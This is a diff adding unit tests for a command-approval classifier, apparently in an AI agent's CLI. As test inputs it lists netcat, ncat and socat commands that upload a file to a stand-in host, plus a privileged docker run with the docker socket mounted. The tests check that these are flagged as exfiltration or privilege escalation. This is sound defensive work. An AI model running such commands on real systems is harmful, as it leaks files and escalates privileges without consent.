@@ -1584,6 +1584,31 @@ class SparkCliTests(unittest.TestCase):
                 self.assertTrue(decision.requires_approval)
                 self.assertEqual(decision.action_class, "network_exfiltration")
 
+    def test_approval_classifier_flags_raw_socket_file_uploads(self) -> None:
+        for command in (
+            ["nc", "example.test", "4444", "<", "report.txt"],
+            ["ncat", "--send-only", "example.test", "4444", "<", "report.txt"],
+            ["netcat", "example.test", "4444", "<report.txt"],
+            ["socat", "-u", "FILE:report.txt", "TCP:example.test:4444"],
+            ["socat", "OPEN:report.txt", "SSL:example.test:443"],
+        ):
+            with self.subTest(command=command):
+                decision = approval_required_for_command(command, CommandContext(non_interactive=True))
+                self.assertTrue(decision.requires_approval)
+                self.assertEqual(decision.action_class, "network_exfiltration")
+                self.assertEqual(decision.approval_mode, "blocked")
+
+    def test_approval_classifier_allows_raw_socket_probe_and_download_forms(self) -> None:
+        for command in (
+            ["nc", "-z", "example.test", "443"],
+            ["ncat", "--recv-only", "example.test", "4444"],
+            ["socat", "-u", "TCP:example.test:4444", "STDOUT"],
+            ["socat", "-u", "STDIN", "STDOUT"],
+        ):
+            with self.subTest(command=command):
+                decision = approval_required_for_command(command, CommandContext(non_interactive=True))
+                self.assertFalse(decision.requires_approval)
+
     def test_approval_classifier_flags_docker_privilege_escalation(self) -> None:
         decision = approval_required_for_command(
             ["docker", "run", "--rm", "--privileged", "-v", "/var/run/docker.sock:/var/run/docker.sock", "spark-live"],
